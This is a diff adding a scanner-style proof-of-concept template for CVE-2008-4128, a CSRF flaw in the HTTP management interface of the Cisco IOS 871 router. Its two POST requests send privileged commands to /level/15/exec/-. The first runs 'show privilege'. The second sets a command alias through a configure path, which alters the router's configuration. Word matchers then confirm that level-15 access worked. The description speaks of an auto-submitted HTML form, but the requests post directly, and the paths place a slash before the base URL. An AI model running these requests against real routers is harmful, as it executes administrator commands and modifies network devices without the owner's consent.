@@ -1,0 +1,58 @@
+[info]
+author = "ave"
+description = "通过构造自动提交的 HTML 表单，向 Cisco IOS 871 路由器 HTTP 管理接口 /level/15/exec/- 发送 POST 请求，利用 CSRF 漏洞以管理员权限执行任意命令。需目标路由器已开启 HTTP 管理服务且管理员已登录。"
+id = "POC-AVE-2008-0066"
+name = "Cisco IOS HTTP Administration CSRF Remote Command Execution PoC"
+severity = "medium"
+tags = ["ave-2008-0066"]
+vuln_id = [
+    "CVE-2008-4128",
+    "AVE-2008-0066",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/level/15/exec/-"
+protocol = "http"
+
+[poc.requests.body]
+content = "command=show+privilege&command_url=/level/15/exec/-"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Privilege",
+    "Level 15",
+    "exec",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/level/15/exec/-/configure/http"
+protocol = "http"
+
+[poc.requests.body]
+content = "command=alias+exec+xx+xx&command_url=/level/15/exec/-&new_command_url=/level/15/configure/-"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Privilege",
+    "Level 15",
+    "configure",
+]
